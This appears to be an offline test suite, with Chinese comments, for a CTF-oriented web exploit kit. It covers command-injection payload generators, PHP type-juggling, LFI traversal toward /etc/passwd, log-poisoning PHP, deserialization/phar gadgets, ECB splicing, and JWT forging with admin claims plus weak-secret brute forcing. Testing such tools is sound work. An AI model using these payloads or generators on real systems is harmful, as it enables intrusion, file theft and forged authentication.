/**
 * dsh-exploit-kit 六个原语模块的纯函数套件（离线：不发请求、不写文件、不连主机）。
 *
 * 断言对象是 **lib/ 产物**（`../lib/*.js`），与运行时同源，不是 src。
 * 覆盖两类路径：
 *   正常路径 —— 每个原语的形状/契约（与 docs/semantic.md §4 逐字对应）
 *   失败/退化路径 —— 空数组、空串、空值、非法枚举、损坏输入、边界值（超长/0/负值）、幂等
 * 后者是 S6（观测不反噬 / 保守返回 / 拒收）的判据来源。测试只做字符串与结构断言，
 * 不执行任何 payload、不触网——本文件的工作对象只是本仓库自己的源码。
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { createHmac } from 'node:crypto'

import { generateCmdi } from '../lib/xp-cmdi.js'
import {
  strstrNumeric, strcmpArray, looseCompare, md5Loose, sqlTruncation, generateJuggling,
} from '../lib/xp-php.js'
import {
  lfiDouble, lfiRelative, nullByte, globObfuscate, logPoison, urlEncode, generateBypass,
} from '../lib/xp-webbypass.js'
import { buildSerializedObject, buildPharMetadata, generateSerialize } from '../lib/xp-serialize.js'
import { planEcbSplice } from '../lib/xp-ecb.js'
import { DEFAULT_WEAK_SECRETS, forgeJwt, bruteForceSecret, bruteJwtSecret } from '../lib/xp-jwt.js'

const r = (v) => v.replace(/\u0000/g, '\\0') // 断言失败时把 NUL 打成人眼可读形式
const b64u = (s) => Buffer.from(s).toString('base64url')
const jwtParts = (t) => t.split('.')
const decodeClaims = (t) => JSON.parse(Buffer.from(jwtParts(t)[1], 'base64url').toString('utf8'))

/* ══════════════════════ 1 · cmdi.ts ══════════════════════ */

test('generateCmdi: 矩阵规模指纹 7 分隔符 × 7 绕过 = 49（semantic.md A3）', () => {
  const out = generateCmdi({ command: 'whoami' })
  assert.equal(out.length, 49)
  assert.equal(new Set(out.map((p) => `${p.sep}/${p.bypass}`)).size, 49, 'sep×bypass 组合必须互不重复')
  for (const p of out) assert.ok(p.payload && p.note, '每项都要有 payload 与 note')
})

test('generateCmdi: 空过滤数组 = 全生成（不传等价，semantic.md A4 / I4）', () => {
  const cmd = 'id'
  assert.deepEqual(
    generateCmdi({ command: cmd, separators: [], bypasses: [] }),
    generateCmdi({ command: cmd }),
  )
})

test('generateCmdi: 分隔符模板逐条正确（none 绕过下即模板本体）', () => {
  const got = (sep) => generateCmdi({ command: 'id', separators: [sep], bypasses: ['none'] })[0].payload
  assert.equal(got('semicolon'), ';id')
  assert.equal(got('pipe'), '|id')
  assert.equal(got('and'), '&&id')
  assert.equal(got('or'), '||id')
  assert.equal(got('newline'), '\nid')
  assert.equal(got('subshell'), '$(id)')
  assert.equal(got('backtick'), '`id`')
})

test('generateCmdi: null_byte 绕过 = 模板 + 字面 NUL（不重复追加）', () => {
  const p = generateCmdi({ command: 'id', separators: ['semicolon'], bypasses: ['null_byte'] })[0]
  assert.equal(r(p.payload), ';id\\0')
  assert.equal(p.bypass, 'null_byte')
})

test('generateCmdi: glob / path_concat 绕过只包装命令本体（不含分隔符前缀）', () => {
  // 已知语义缺口 3（semantic.md §5）：这两类产物不带分隔符，通常不能单独作为注入 payload——
  // 锁现状：把它们**当完整 payload 用**是误用，模型须自行补分隔符。
  const glob = generateCmdi({ command: 'id', separators: ['pipe'], bypasses: ['glob'] })[0]
  const pathc = generateCmdi({ command: 'cat /etc/passwd', separators: ['pipe'], bypasses: ['path_concat'] })[0]
  assert.equal(glob.payload, '[iI][dD]')
  assert.equal(pathc.payload, 'cat /eEtc/pPasswd')
})

test('generateCmdi: space_ifs 绕过把空格换成 ${IFS}（同样不含分隔符前缀）', () => {
  const p = generateCmdi({ command: 'cat x', separators: ['semicolon'], bypasses: ['space_ifs'] })[0]
  assert.equal(p.payload, 'cat${IFS}x')
})

test('generateCmdi: base64 绕过按 shell 分支（sh 走 echo|base64 -d|sh）', () => {
  const sh = generateCmdi({ command: 'id', separators: ['semicolon'], bypasses: ['base64'] })[0]
  assert.equal(sh.payload, `echo ${Buffer.from('id').toString('base64')} | base64 -d | sh`)
  const win = generateCmdi({ command: 'id', separators: ['semicolon'], bypasses: ['base64'], shell: 'cmd' })[0]
  assert.match(win.payload, /certutil -decode/)
})

test('generateCmdi: 退化路径——case 绕过是恒等包装（与 none 产物重复，semantic.md U5）', () => {
  const args = { command: 'id', separators: ['semicolon'] }
  const none = generateCmdi({ ...args, bypasses: ['none'] })[0].payload
  const kase = generateCmdi({ ...args, bypasses: ['case'] })[0].payload
  assert.equal(kase, none)
  // note 不同（一个讲 no-bypass，一个讲大小写匹配），所以只是产物重复，不是记录重复
})

test('generateCmdi: 退化路径——空 command 仍返回 49 条（index.ts 的「command 为空」守卫不可达）', () => {
  const out = generateCmdi({ command: '' })
  assert.equal(out.length, 49, '空命令也会生成 ; | && 等裸分隔符 payload，故长度不为 0')
  // 证据：xp_cmdi_payload 的 `if (!payloads.length) return {ok:false,error:'command 为空'}` 是死分支
  // （只有 separators/bypasses 过滤出空集才可能为空，而空数组按 I4 被视为「全生成」）。
})

test('generateCmdi: 失败路径——未知分隔符抛 TypeError（表查空，非保守返回）', () => {
  assert.throws(() => generateCmdi({ command: 'id', separators: ['bogus'] }), /tpl/)
})

test('generateCmdi: 失败路径——未知绕过抛 TypeError', () => {
  assert.throws(() => generateCmdi({ command: 'id', separators: ['semicolon'], bypasses: ['bogus'] }), /wrap/)
})

test('generateCmdi: 幂等——同参数重复调用深度相等（纯函数，无隐藏状态）', () => {
  const a = generateCmdi({ command: 'id /tmp' })
  const b = generateCmdi({ command: 'id /tmp' })
  assert.deepEqual(a, b)
})

/* ══════════════════════ 2 · php.ts ══════════════════════ */

test('strstrNumeric: 前导数字 = gt+1，尾部含 needle（natas23）', () => {
  const c = strstrNumeric('iloveyou', 10)
  assert.equal(c.kind, 'strstr_numeric')
  assert.equal(c.value, '11iloveyou')
  assert.equal(c.target, "strstr($input,'iloveyou') && $input>10")
})

test('strstrNumeric: 边界——gt=0 时前导数字为 1', () => {
  assert.equal(strstrNumeric('x', 0).value, '1x')
})

test('strcmpArray: 数组绕过值固定为 param[]=x', () => {
  const c = strcmpArray()
  assert.equal(c.kind, 'strcmp_array')
  assert.equal(c.value, 'param[]=x')
})

test('looseCompare: 退化——空 hint 回填 0e0；有 hint 时原样使用', () => {
  assert.deepEqual(looseCompare('').map((c) => c.value), ['0', '0e0'])
  assert.deepEqual(looseCompare('abc').map((c) => c.value), ['0', 'abc'])
  assert.ok(looseCompare('').every((c) => c.kind === 'loose_compare' && c.note))
})

test('md5Loose: 退化——空数组回落到内置默认值', () => {
  assert.equal(md5Loose([]).value, '240610708')
  const custom = md5Loose(['A', 'B'])
  assert.equal(custom.value, 'A')
  assert.match(custom.note, /A \/ B/)
})

test('sqlTruncation: 正常路径——crafted 长度 = maxLen + 2（保证超过字段长被截断）', () => {
  const c = sqlTruncation('user', 64, 'pw')
  const crafted = c.value.slice('username='.length, c.value.indexOf(' / password='))
  assert.equal(crafted.length, 66)
  assert.equal(crafted, 'user' + ' '.repeat(61) + 'x')
  assert.ok(c.value.endsWith('x / password=pw'))
  assert.equal(c.kind, 'type_magic')
})

test('sqlTruncation: 边界——用户名已达/超过字段长不得抛 RangeError（负重复计数）', () => {
  // 修复前（lib 产物实测证据）：sqlTruncation('a'.repeat(70), 64, 'pw')
  //   → RangeError: Invalid count value: -5   （' '.repeat(64 - 70 + 1)）
  // 这正是 natas27 的主场景（用户名必须比字段长才会被截断），所以是**真缺陷**而非边界奇想。
  // 修复 = 把填充数下限钳到 0（src/php.ts），保持「crafted 恒长于 maxLen」这一契约不变。
  for (const len of [63, 64, 65, 66, 70, 200]) {
    const c = sqlTruncation('a'.repeat(len), 64, 'pw')
    const crafted = c.value.slice('username='.length, c.value.indexOf(' / password='))
    assert.ok(crafted.length > 64, `len=${len} 时 crafted=${crafted.length} 必须 > maxLen(64)`)
  }
})

test('generateJuggling: 缺省 = 全生成但跳过参数不足的分支（4 条）', () => {
  // 无 needle → 跳过 strstr_numeric；无 username/maxLen → 跳过 type_magic
  const out = generateJuggling({})
  assert.equal(out.length, 4)
  assert.deepEqual(out.map((c) => c.kind), ['strcmp_array', 'loose_compare', 'loose_compare', 'md5_loose'])
})

test('generateJuggling: 参数齐备 = 6 条候选', () => {
  const out = generateJuggling({ needle: 'iloveyou', gt: 10, username: 'u', maxLen: 64, password: 'p' })
  assert.equal(out.length, 6)
  assert.equal(out[0].value, '11iloveyou')
  assert.equal(out[5].kind, 'type_magic')
})

test('generateJuggling: 退化——参数不足返回空数组（由接线层转 ok:false）', () => {
  assert.deepEqual(generateJuggling({ kind: 'strstr_numeric' }), [])
  assert.deepEqual(generateJuggling({ kind: 'type_magic' }), [])
  assert.deepEqual(generateJuggling({ kind: 'type_magic', username: 'u' }), [], '只有 username 没有 maxLen 仍不足')
})

test('generateJuggling: 失败路径——未知 kind 静默返回空数组（不抛）', () => {
  assert.deepEqual(generateJuggling({ kind: 'bogus' }), [])
})

/* ══════════════════════ 3 · webbypass.ts ══════════════════════ */

test('lfiDouble: 每个 ../ 写成 ....//（绕过单次 str_replace，natas25）', () => {
  assert.equal(lfiDouble('../../../../etc/passwd').payload, '....//....//....//....//etc/passwd')
  assert.equal(lfiDouble('../x').payload, '....//x')
})

test('lfiDouble: 退化——无 ../ 的输入原样返回（仍是合法返回值，不抛）', () => {
  assert.equal(lfiDouble('').payload, '')
  assert.equal(lfiDouble('/etc/passwd').payload, '/etc/passwd')
})

test('lfiRelative: depth 决定 ../ 层数', () => {
  assert.equal(lfiRelative('etc/passwd', 4).payload, '../../../../etc/passwd')
  assert.equal(lfiRelative('etc/passwd', 1).payload, '../etc/passwd')
})

test('lfiRelative: 退化——depth=0 输出无穿越前缀（依旧返回候选而非报错）', () => {
  assert.equal(lfiRelative('etc/passwd', 0).payload, 'etc/passwd')
})

test('nullByte: %00 后缀截断（natas29）', () => {
  const c = nullByte('|cat /etc/passwd')
  assert.equal(c.payload, '|cat /etc/passwd%00')
  assert.equal(c.kind, 'null_byte')
})

test('globObfuscate: 每个字母变成 [aA] 字符类', () => {
  assert.equal(globObfuscate('natas').payload, '[nN][aA][tT][aA][sS]')
  assert.equal(globObfuscate('').payload, '', '退化：空串不抛，原样返回')
  assert.equal(globObfuscate('123').payload, '123', '退化：无字母则不变')
})

test('logPoison: 包成 <?php ...; ?>（UA 注入）；退化——输入自带分号会得到双分号', () => {
  // 真实语义：logPoison 自己补一个分号，故输入**不应**自带结尾分号。
  assert.equal(logPoison("echo 'PWNED'").payload, "<?php echo 'PWNED'; ?>")
  // 退化路径：输入已带 `;` → 产物 `;;`（PHP 空语句，无害但不整洁；generateBypass 的默认值正是这种形态）
  assert.equal(logPoison("echo 'PWNED';").payload, "<?php echo 'PWNED';; ?>")
  assert.equal(generateBypass({ kind: 'log_poison' })[0].payload, "<?php echo 'PWNED';; ?>")
})

test('urlEncode: 单次/双重编码', () => {
  const s = '<script>alert(1)</script>'
  const one = urlEncode(s, false).payload
  assert.equal(one, '%3Cscript%3Ealert(1)%3C%2Fscript%3E')
  const two = urlEncode(s, true).payload
  assert.equal(two, encodeURIComponent(one))
  assert.notEqual(two, one)
})

test('urlEncode: 退化——空串编码为空串', () => {
  assert.equal(urlEncode('', false).payload, '')
  assert.equal(urlEncode('', true).payload, '')
})

test('generateBypass: 缺省 = 6 类候选；指定 kind = 1 条', () => {
  assert.equal(generateBypass({}).length, 6)
  assert.equal(generateBypass({ kind: 'lfi_double' }).length, 1)
  assert.deepEqual(generateBypass({}).map((c) => c.kind), [
    'lfi_double', 'lfi_relative', 'null_byte', 'glob_obfuscate', 'log_poison', 'encode',
  ])
})

test('generateBypass: 失败路径——未知 kind 静默返回空数组（不抛、不报错）', () => {
  assert.deepEqual(generateBypass({ kind: 'bogus' }), [])
})

/* ══════════════════════ 4 · serialize.ts ══════════════════════ */

test('buildSerializedObject: private 属性名 = \\0ClassName\\0prop，键长按字节算（A7）', () => {
  const s = buildSerializedObject({ className: 'Logger', properties: { logFile: 'pwn.php' } })
  assert.equal(r(s), 'O:6:"Logger":1:{s:15:"\\0Logger\\0logFile";s:7:"pwn.php";}')
})

test('buildSerializedObject: protected 用 \\0*\\0，public 用裸名', () => {
  assert.equal(r(buildSerializedObject({ className: 'L', properties: { a: 'b' }, visibility: 'protected' })),
    'O:1:"L":1:{s:4:"\\0*\\0a";s:1:"b";}')
  assert.equal(buildSerializedObject({ className: 'L', properties: { a: 'b' }, visibility: 'public' }),
    'O:1:"L":1:{s:1:"a";s:1:"b";}')
})

test('buildSerializedObject: 字符串长度用 UTF-8 字节数而非字符数', () => {
  assert.equal(buildSerializedObject({ className: 'L', properties: { a: '中文' } }), 'O:1:"L":1:{s:4:"\u0000L\u0000a";s:6:"中文";}')
})

test('buildSerializedObject: bool/int/float 分别编码为 b:/i:/d:', () => {
  const s = buildSerializedObject({ className: 'L', properties: { a: true, b: false, c: 3, d: 1.5 } })
  assert.match(s, /b:1;/)
  assert.match(s, /b:0;/)
  assert.match(s, /i:3;/)
  assert.match(s, /d:1\.5;/)
})

test('buildSerializedObject: 退化——空属性表得到 O:n:"cls":0:{}', () => {
  assert.equal(buildSerializedObject({ className: 'L', properties: {} }), 'O:1:"L":0:{}')
  assert.equal(buildSerializedObject({ className: '', properties: {} }), 'O:0:"":0:{}')
})

test('generateSerialize: base64 / urlEncode 包装链（serialized → base64 → URL）', () => {
  const opts = { className: 'L', properties: { a: 'b' } }
  const plain = generateSerialize(opts)
  assert.equal(plain.ready, plain.serialized)
  const b64 = generateSerialize({ ...opts, base64: true })
  assert.equal(b64.ready, Buffer.from(b64.serialized, 'utf8').toString('base64'))
  const both = generateSerialize({ ...opts, base64: true, urlEncode: true })
  assert.equal(both.ready, encodeURIComponent(b64.ready))
})

test('generateSerialize: notes 随开关增补，且恒含 __destruct 提醒', () => {
  // 真实语义：private 提示只在 visibility **显式等于** 'private' 时出现——
  // 「默认 private」是**接线层**（index.ts 的 `args.visibility ?? 'private'`）的责任，函数层不兜底。
  const bare = generateSerialize({ className: 'L', properties: { a: 'b' } })
  assert.equal(bare.notes.length, 1)
  assert.ok(bare.notes[0].includes('__destruct'))
  const priv = generateSerialize({ className: 'L', properties: { a: 'b' }, visibility: 'private' })
  assert.equal(priv.notes.length, 2)
  assert.ok(priv.notes[0].includes('\u0000ClassName\u0000propName'))
  const full = generateSerialize({
    className: 'L', properties: { a: 'b' }, visibility: 'private', base64: true, urlEncode: true,
  })
  assert.equal(full.notes.length, 4)
  assert.ok(full.notes.at(-1).includes('__destruct'))
})

test('generateSerialize: pharSteps 仅在两参数齐备时生成（退化：缺一 → undefined）', () => {
  const o = { className: 'L', properties: { a: 'b' } }
  assert.equal(generateSerialize(o).pharSteps, undefined)
  assert.equal(generateSerialize({ ...o, pharClassDef: 'class E{}' }).pharSteps, undefined)
  assert.equal(generateSerialize({ ...o, pharMetadata: 'O:1:"E":0:{}' }).pharSteps, undefined)
  const steps = generateSerialize({ ...o, pharClassDef: 'class E{}', pharMetadata: 'O:1:"E":0:{}' }).pharSteps
  assert.match(steps, /phar\.readonly=0/)
  assert.match(steps, /setMetadata\(unserialize\('O:1:"E":0:\{\}'\)\)/)
})

test('buildPharMetadata: 路径参数缺省回落 /tmp/test.phar + pwn.php', () => {
  const s = buildPharMetadata({ classDef: 'class E{}', metadata: 'x' })
  assert.match(s, /\/tmp\/test\.phar/)
  assert.match(s, /'pwn\.php'/)
  const custom = buildPharMetadata({ classDef: 'class E{}', metadata: 'x', pharPath: '/tmp/a.phar', triggerFile: 't.php' })
  assert.match(custom, /'\/tmp\/a\.phar'/)
  assert.match(custom, /'t\.php'/)
})

/* ══════════════════════ 5 · ecb.ts ══════════════════════ */

test('planEcbSplice: 38/36 → 填充 12 字节，splice 块索引与手算一致（A9）', () => {
  const p = planEcbSplice({ prefixLen: 38, injectOffset: 36, payload: 'X' })
  assert.equal(p.oracleCalls[0].input, 'A'.repeat(12))
  assert.equal(p.oracleCalls[0].blocks, '块 0..2')
  assert.equal(p.oracleCalls[1].input, 'A'.repeat(12) + 'X')
  assert.equal(p.oracleCalls[1].blocks, '从第 3 块起')
  assert.equal(p.splice, 'C1[0..2] + C2[3..]')
  assert.equal(p.pitfalls.length, 4)
  assert.match(p.plan, /需要填充 12 字节/)
})

test('planEcbSplice: 注入点已对齐块边界 → 无需填充（边界值 fill=0）', () => {
  const p = planEcbSplice({ prefixLen: 38, injectOffset: 32, payload: 'X' })
  assert.equal(p.oracleCalls[0].input, '')
  assert.equal(p.splice, 'C1[0..1] + C2[2..]')
})

test('planEcbSplice: blockSize 可覆盖（8 字节块）', () => {
  const p = planEcbSplice({ prefixLen: 1, injectOffset: 3, payload: 'X', blockSize: 8 })
  assert.equal(p.oracleCalls[0].input, 'AAAAA') // (8 - 3%8) % 8 = 5
  assert.match(p.plan, /块 8B/)
})

test('planEcbSplice: escapeChar 只影响文案（addslashes 说明）', () => {
  const p = planEcbSplice({ prefixLen: 1, injectOffset: 4, payload: 'X', escapeChar: '#' })
  assert.ok(p.pitfalls[1].includes('#'))
})

test('planEcbSplice: 退化——prefixLen 不参与对齐计算（只出现在 plan 文案里）', () => {
  const a = planEcbSplice({ prefixLen: 0, injectOffset: 36, payload: 'X' })
  const b = planEcbSplice({ prefixLen: 999, injectOffset: 36, payload: 'X' })
  assert.equal(a.splice, b.splice)
  assert.notEqual(a.plan, b.plan)
})

test('planEcbSplice: 退化——injectOffset=0 产出空块区间（接线层已拦 0，函数层不拦）', () => {
  const p = planEcbSplice({ prefixLen: 0, injectOffset: 0, payload: 'X' })
  assert.equal(p.oracleCalls[0].blocks, '块 0..-1')
  assert.equal(p.splice, 'C1[0..-1] + C2[0..]')
})

test('planEcbSplice: 失败路径——blockSize=0 让 NaN 传播进 splice（工具层未校验）', () => {
  const p = planEcbSplice({ prefixLen: 1, injectOffset: 5, payload: 'X', blockSize: 0 })
  assert.equal(p.splice, 'C1[0..NaN] + C2[NaN..]')
  // 不抛异常：坏输入退化成不可用字符串，而不是崩溃（保守返回，但**不拒收**——见 §10 U7）
})

/* ══════════════════════ 6 · jwt.ts ══════════════════════ */

test('DEFAULT_WEAK_SECRETS: 内置字典无重复且含 WebGoat 实战密钥', () => {
  assert.equal(DEFAULT_WEAK_SECRETS.length, 16)
  assert.equal(new Set(DEFAULT_WEAK_SECRETS).size, DEFAULT_WEAK_SECRETS.length)
  for (const s of ['victory', 'business', 'available', 'shipping', 'washington']) {
    assert.ok(DEFAULT_WEAK_SECRETS.includes(s), `缺 ${s}`)
  }
})

test('forgeJwt: 无 secret → secretSource=none，只回第 0 个候选的 token（U1 现状锁）', () => {
  const res = forgeJwt({ username: 'admin' })
  assert.equal(res.secretSource, 'none')
  assert.equal(res.foundSecret, undefined)
  assert.equal(res.candidates.length, 16)
  const [h, p, s] = jwtParts(res.token)
  assert.equal(s, createHmac('sha256', DEFAULT_WEAK_SECRETS[0]).update(`${h}.${p}`).digest('base64url'),
    '返回的 token 必须是用 candidates[0] 签的（note 声称 N 个候选，实际只回第 0 个）')
})

test('forgeJwt: 有 secret → manual 自签，签名可用 node:crypto 重算（A5）', () => {
  const res = forgeJwt({ username: 'admin', secret: 'washington' })
  assert.equal(res.secretSource, 'manual')
  assert.equal(res.foundSecret, 'washington')
  const [h, p, s] = jwtParts(res.token)
  assert.equal(JSON.parse(Buffer.from(h, 'base64url').toString('utf8')).alg, 'HS256')
  assert.equal(s, createHmac('sha256', 'washington').update(`${h}.${p}`).digest('base64url'))
})

test('forgeJwt: claims 注入形态（username / sub / role=[admin] / iat / exp=+3600）', () => {
  const c = decodeClaims(forgeJwt({ username: 'Alice', secret: 'k' }).token)
  assert.equal(c.username, 'Alice')
  assert.equal(c.sub, 'Alice')
  assert.deepEqual(c.role, ['admin'])
  assert.equal(c.exp - c.iat, 3600)
})

test('forgeJwt: 退化——无 username 时不注入角色类 claims，extraClaims 仍合并', () => {
  const c = decodeClaims(forgeJwt({ secret: 'k', extraClaims: { role: ['user'], custom: 7 } }).token)
  assert.deepEqual(c, { role: ['user'], custom: 7 })
})

test('forgeJwt: 退化——空串 secret 视为未指定（走 none 分支）', () => {
  const res = forgeJwt({ username: 'u', secret: '' })
  assert.equal(res.secretSource, 'none')
  assert.equal(res.foundSecret, undefined)
})

test('forgeJwt: 退化——空 secrets 数组回落到内置字典', () => {
  assert.equal(forgeJwt({ username: 'u', secrets: [] }).candidates.length, 16)
  assert.deepEqual(forgeJwt({ username: 'u', secrets: ['only'] }).candidates, ['only'])
})

test('forgeJwt: alg 覆盖 HS384 / HS512 签名算法一致', () => {
  for (const [alg, hash] of [['HS384', 'sha384'], ['HS512', 'sha512']]) {
    const [h, p, s] = jwtParts(forgeJwt({ username: 'u', secret: 'k', alg }).token)
    assert.equal(JSON.parse(Buffer.from(h, 'base64url').toString('utf8')).alg, alg)
    assert.equal(s, createHmac(hash, 'k').update(`${h}.${p}`).digest('base64url'))
  }
})

test('bruteForceSecret: 直接命中 / 未命中 / 段数不符（损坏输入一律 undefined，不抛）', () => {
  const token = forgeJwt({ username: 'u', secret: 'washington' }).token
  assert.equal(bruteForceSecret(token, DEFAULT_WEAK_SECRETS), 'washington')
  assert.equal(bruteForceSecret(token, ['nope']), undefined)
  assert.equal(bruteForceSecret('not-a-token', DEFAULT_WEAK_SECRETS), undefined)
  assert.equal(bruteForceSecret('', DEFAULT_WEAK_SECRETS), undefined)
  assert.equal(bruteForceSecret('a.b', DEFAULT_WEAK_SECRETS), undefined)
  assert.equal(bruteForceSecret('a.b.c.d', DEFAULT_WEAK_SECRETS), undefined)
})

test('bruteJwtSecret: 命中已知弱密钥（A6）', () => {
  const token = forgeJwt({ username: 'admin', secret: 'shipping' }).token
  const res = bruteJwtSecret(token)
  assert.equal(res.foundSecret, 'shipping')
  assert.equal(res.secretSource, 'bruteforce')
  assert.match(res.note, /爆破命中/)
})

test('bruteJwtSecret: 失败路径——未命中返回 undefined + secretSource=none（不抛）', () => {
  const res = bruteJwtSecret('a.b.c')
  assert.equal(res.foundSecret, undefined)
  assert.equal(res.secretSource, 'none')
  assert.match(res.note, /未命中/)
  assert.equal(res.token, undefined)
})

test('bruteJwtSecret: 失败路径——损坏 token（非 JWT 形态）保守返回，不抛', () => {
  for (const bad of ['not-a-token', '', '..', 'a.b.c.d', 'x'.repeat(500)]) {
    const res = bruteJwtSecret(bad)
    assert.equal(res.foundSecret, undefined, `输入 ${JSON.stringify(bad.slice(0, 12))} 必须保守返回`)
    assert.equal(res.secretSource, 'none')
  }
})

test('bruteJwtSecret: 额外字典前置并入候选（长度 = extra + 内置）', () => {
  const token = forgeJwt({ username: 'u', secret: 'zzz-custom' }).token
  const res = bruteJwtSecret(token, ['zzz-custom'])
  assert.equal(res.foundSecret, 'zzz-custom')
  assert.equal(res.candidates[0], 'zzz-custom')
  assert.equal(res.candidates.length, DEFAULT_WEAK_SECRETS.length + 1)
})

test('jwt: 幂等——不注入时间 claims 时逐字节稳定（同输入 → 同 token）', () => {
  // username 会注入 iat/exp（依赖 Date.now），故用 extraClaims 构造无时间依赖的确定性输入
  const args = { secret: 'k', extraClaims: { sub: 'u', role: ['admin'] } }
  assert.equal(forgeJwt(args).token, forgeJwt(args).token)
})
